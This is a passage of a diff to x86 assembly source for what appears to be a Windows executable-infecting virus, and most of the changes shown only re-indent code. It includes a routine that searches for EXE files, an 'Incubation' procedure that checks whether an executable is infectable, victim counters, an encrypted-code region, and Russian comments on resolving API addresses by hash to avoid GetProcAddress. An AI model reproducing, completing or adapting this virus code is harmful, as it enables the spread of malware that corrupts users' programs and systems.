+	pop eax;now in eax  dir address and name
+	mov esi, eax
+	call SearchEXE 
+	pop esi
+	push eax
+	call [edi+offset _LocalFree]
 not_dir:
-lea eax,w32fd
-pop ecx
-push ecx
-push eax
-push ecx
-call [edi+offset _FindNextFileA]
-cmp eax, TRUE
-jz loop6
+	lea eax,w32fd
+	pop ecx
+	push ecx
+	push eax
+	push ecx
+	call [edi+offset _FindNextFileA]
+	cmp eax, TRUE
+	jz loop6
 
 exit:
-call [edi+offset _CloseHandle]
-popfd
-popad
-ret
+	call [edi+offset _CloseHandle]
+	popfd
+	popad
+	ret
 SearchEXE endp
 
 ;------------------------------------------------------------------------------------
 ;in: 
-;esi: path to exe
+;	esi: path to exe
 ;out:
-;eax:number of last section in section table ;-1 - exe isnlt infectable
+;	eax:number of last section in section table ;-1 - exe isnlt infectable
 ;------------------------------------------------------------------------------------
 Incubation proc
 	pushfd
@@ -1873,8 +1878,6 @@ GetLastError_ db 'GetLastError',0;13
 ;как только находим такой же хеш в таблице экспорта - запоминаем адрес в нашем массиве адресов функций с таким же индексом
 ;все это делать придется вручную, а не через GetProcAddress, т.к. имен не будет
 
-
-
 victim dd 1
 victim_count dd 1
 entry_point dd 1000h
@@ -1883,9 +1886,9 @@ rva_code dd 1000h
 path db 'C:\laboratory',0
 
 ending_crypto:
-key dd 0
+	key dd 0
 
 ending:
-push 0
-call ExitProcess
+	push 0
+	call ExitProcess
 end start
